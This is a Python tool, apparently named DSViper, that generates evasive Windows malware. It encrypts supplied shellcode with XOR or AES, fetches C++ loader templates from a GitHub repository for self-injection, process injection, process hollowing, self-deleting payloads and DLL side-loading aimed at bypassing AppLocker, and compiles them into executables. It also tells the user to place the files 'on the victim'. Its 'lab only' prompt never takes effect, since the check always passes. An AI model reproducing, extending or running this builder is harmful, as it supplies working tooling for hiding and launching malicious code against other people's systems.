#!/usr/bin/python3 
import os
import argparse
from colorama import init, Fore
import sys
import random
from os import urandom
import requests
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hashlib

def xorEncrypt(plaintext, key):
    print("\n")
    
    ciphertext = bytearray()
    for i in range(len(plaintext)):
        # XOR each byte with the key in a repeating pattern
        ciphertext.append(plaintext[i] ^ key[i % len(key)])
    
    return bytes(ciphertext)
    
    
def AESencrypt(plaintext, key):
    k = hashlib.sha256(key).digest()  # Derive the AES key using SHA-256
    iv = 16 * b'\x00'  # Initialization vector (16 bytes, zeroed)
    plaintext = pad(plaintext, AES.block_size)  # Pad the plaintext
    cipher = AES.new(k, AES.MODE_CBC, iv)  # Create AES cipher in CBC mode
    ciphertext = cipher.encrypt(plaintext)  # Encrypt the padded plaintext
    return ciphertext, key
    
def AESencrypt_with_iv(plaintext, key, iv):
    k = hashlib.sha256(key).digest()  # Derive a 32-byte key using SHA-256  
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)  # Use the passed IV
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext,key,iv
        
def HAVOCone():
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    WHITE = "\033[97m"
    
    with open(payload_name, "rb") as file:
        content = file.read()
    key = [random.randint(0, 255) for _ in range(16)]
    ciphertext = xorEncrypt(content, key)

    XOR_key = bytes(key)
    with open("key.bin", "wb") as f:
        f.write(XOR_key)

    XOR_code = bytes(ciphertext)
    with open("code.bin", "wb") as f:
        f.write(XOR_code)

    with open("resources.rc", "wb") as f:
        f.write('dhanushcode56   RCDATA   "code.bin"\n'.encode('utf-8'))
        f.write('dhanushkey1    RCDATA   "key.bin"\n'.encode('utf-8'))

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/xoxo.cpp"
    try:
        res = requests.get(url)
        with open("xoxo.cpp", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_xor.exe", "xoxo.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_xor.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["code.bin", "key.bin", "resources.res", "resources.rc", "xoxo.cpp"]
    for file in files:
        os.remove(file)

def HAVOCtwo():
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    WHITE = "\033[97m"       
    with open(payload_name, "rb") as file:
            content = file.read()
    KEY = urandom(16)
    
    ciphertext, key = AESencrypt(content, KEY)
    
    with open("key.bin", "wb") as key_file:
        key_file.write(KEY)

    # Save the encrypted payload to a binary file (AEScode.bin)
    with open("code.bin", "wb") as code_file:
        code_file.write(ciphertext)
    
    with open("resources.rc", "wb") as f:
        f.write('dhanushcode56   RCDATA   "code.bin"\n'.encode('utf-8'))
        f.write('dhanushkey1    RCDATA   "key.bin"\n'.encode('utf-8'))

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/kumaes.cpp"
    try:
        res = requests.get(url)
        with open("AESbypass.cpp", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)
    
    try:
        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_AES.exe", "AESbypass.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_AES.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = [ "code.bin", "key.bin", "resources.res", "resources.rc", "AESbypass.cpp"]
    for file in files:
        os.remove(file)        
    
def HAVOCfour():
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    WHITE = "\033[97m" 
    
    with open(payload_name, "rb") as file:
        content = file.read()
    key = [random.randint(0, 255) for _ in range(16)]
    ciphertext = xorEncrypt(content, key)

    XOR_key = bytes(key)
    with open("key.bin", "wb") as f:
        f.write(XOR_key)

    XOR_code = bytes(ciphertext)
    with open("code.bin", "wb") as f:
        f.write(XOR_code)

    with open("resources.rc", "wb") as f:
        f.write('dhanushcode56   RCDATA   "code.bin"\n'.encode('utf-8'))
        f.write('dhanushkey1    RCDATA   "key.bin"\n'.encode('utf-8'))

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/procinj2.cpp"
    try:
        res = requests.get(url)
        with open("Processinj_XOR.cpp", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_spoolsv.exe", "Processinj_XOR.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_spoolsv.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["code.bin", "key.bin", "resources.res", "resources.rc", "Processinj_XOR.cpp"]
    for file in files:
        os.remove(file)

def HAVOCsixAES_withhollow():
    with open(payload_name, "rb") as file:
            content = file.read()
    KEY = urandom(16)
    
    ciphertext, key = AESencrypt(content, KEY)
    
    
    ciphertext_str = ', '.join(f'0x{byte:02x}' for byte in ciphertext)
    key_str = ', '.join(f'0x{byte:02x}' for byte in KEY)
    aeskey=f"unsigned char ke185hams[] = {{ {key_str} }};"
    aescode=f"unsigned char itsthecod345[] = {{ {ciphertext_str} }};"
    
    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/hollow_aes.cpp"
    
    try:
        res = requests.get(url)
        content1=res.text
        content1=content1.replace('unsigned char ke185hams[] = {};',aeskey)
        content1=content1.replace('unsigned char itsthecod345[] = {};',aescode)
        with open("hollow_aes.cpp", "wb") as f:
            f.write(content1.encode('utf-8'))
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)
        
    try:
        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_hollow.exe", "hollow_aes.cpp", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_hollow.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["hollow_aes.cpp"]
    for file in files:
        os.remove(file)
        
def HAVOCseven_dynamic_dhanush():
    with open(payload_name, "rb") as file:
        content = file.read()
    key = [random.randint(0, 255) for _ in range(16)]
    ciphertext = xorEncrypt(content, key)

    XOR_key = bytes(key)
    with open("key.bin", "wb") as f:
        f.write(XOR_key)

    XOR_code = bytes(ciphertext)
    with open("code.bin", "wb") as f:
        f.write(XOR_code)

    with open("resources.rc", "wb") as f:
        f.write('dhanushcode56   RCDATA   "code.bin"\n'.encode('utf-8'))
        f.write('dhanushkey1    RCDATA   "key.bin"\n'.encode('utf-8'))

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/hollow_dynamic.cpp"
    try:
        res = requests.get(url)
        with open("hollow.cpp", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_selfdelete.exe", "hollow.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_selfdelete.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["code.bin", "key.bin", "resources.res", "resources.rc", "hollow.cpp"]
    for file in files:
        os.remove(file)
        
        
def HAVOCeightAES_hollow_dll():
    with open(payload_name, "rb") as file:
            content = file.read()
    KEY = urandom(16)
    
    ciphertext, key = AESencrypt(content, KEY)
    
    
    ciphertext_str = ', '.join(f'0x{byte:02x}' for byte in ciphertext)
    key_str = ', '.join(f'0x{byte:02x}' for byte in KEY)
    aeskey=f"unsigned char ke185hams[] = {{ {key_str} }};"
    aescode=f"unsigned char itsthecod345[] = {{ {ciphertext_str} }};"
    
    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/dll/dll_dynamic_hollow.cpp"
    url2= "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/dll/process.cpp"
    try:
        res1=requests.get(url2)
        with open("process.cpp","wb") as f:
            f.write(res1.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)
    
    try:
        res = requests.get(url)
        content1=res.text
        content1=content1.replace('unsigned char ke185hams[] = {};',aeskey)
        content1=content1.replace('unsigned char itsthecod345[] = {};',aescode)
        with open("hollow_aes_dll.cpp", "wb") as f:
            f.write(content1.encode('utf-8'))
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)
        
    try:
        subprocess.run(["x86_64-w64-mingw32-g++","-shared", "-o", "dhanushgowda.dll", "hollow_aes_dll.cpp","-lws2_32","-lwinhttp","-lcrypt32","-static-libgcc","-static-libstdc++", "-fpermissive"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        #x86_64-w64-mingw32-g++ -shared -o imm32.dll dll.cpp -lws2_32 -lwinhttp -lcrypt32 -static-libgcc -static-libstdc++ -fpermissive
        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_dll.exe", "process.cpp", "-fpermissive"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_dll.exe and dhanushgowda.dll")
        print(f"{GREEN}{BOLD}[*]Transfer both the executable and the dll on the victim in the same directory,execute DSViper_havocdll.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["hollow_aes_dll.cpp","process.cpp"]
    for file in files:
        os.remove(file) 

def HAVOCnine_enc():
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    WHITE = "\033[97m" 
    
    with open(payload_name, "rb") as file:
        content = file.read()
    key = [random.randint(0, 255) for _ in range(16)]
    ciphertext = xorEncrypt(content, key)

    XOR_key = bytes(key)
    with open("key.bin", "wb") as f:
        f.write(XOR_key)

    XOR_code = bytes(ciphertext)
    with open("code.bin", "wb") as f:
        f.write(XOR_code)

    with open("resources.rc", "wb") as f:
        f.write('dhanushcode56   RCDATA   "code.bin"\n'.encode('utf-8'))
        f.write('dhanushkey1    RCDATA   "key.bin"\n'.encode('utf-8'))

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/procinj_enc.cpp"
    try:
        res = requests.get(url)
        with open("Processinj_XOR.cpp", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_exp.exe", "Processinj_XOR.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_exp.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["code.bin", "key.bin", "resources.res", "resources.rc", "Processinj_XOR.cpp"]
    for file in files:
        os.remove(file)


if __name__ == "__main__":
    WHITE = "\033[97m"
    RED = "\33[91m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BOLD = "\033[1m"
    MAGENTA = "\033[35m"
    RESET = "\033[0m"    
    optionss=input(f"{WHITE}You sure you want to Continue?(Use it ethically, and in lab enviroments only) y/n:{WHITE} ")
    if optionss=="y" or "Y":
        havoc=input(f"{WHITE}Enter your payload choice:\n1.)injection(XOR)\n2.)injection(AES)\n3.)Process Injection(spoolsv)\n4.)Process Hollow\n{WHITE}5.)Self Deleting Malware{WHITE}\n6.)DLL side-load/rundll32 applocker bypass{WHITE}\n7.Injection EXE(explorer.exe)\ne.{RED}Exit{WHITE}\n>")
        payload_name =  input("Please type in the shellcode file name: ")
        if havoc=="1":
            print(f"Selected self-injection(XOR)")
            HAVOCone()
        elif havoc=="2":
            print(f"Selected self-injection(AES)")
            HAVOCtwo()
            
        elif havoc=="3":
            print(f"Selected Process Injection(spoolsv)")
            HAVOCfour()
        
        elif havoc=="4":
            print(f"Selected Process Hollow")
            HAVOCsixAES_withhollow()
        elif havoc=="5":
            print(f"Selected Self Deleting Malware")
            HAVOCseven_dynamic_dhanush()
        elif havoc=="6":
            HAVOCeightAES_hollow_dll()        
        elif havoc=="7":
            HAVOCnine_enc()
        elif havoc=="e":
             exit
             print("Uscita....")
        else:
            print("Invalid option")
            exit(1)
    elif optionss=="n" or optionss=="N":
        exit()
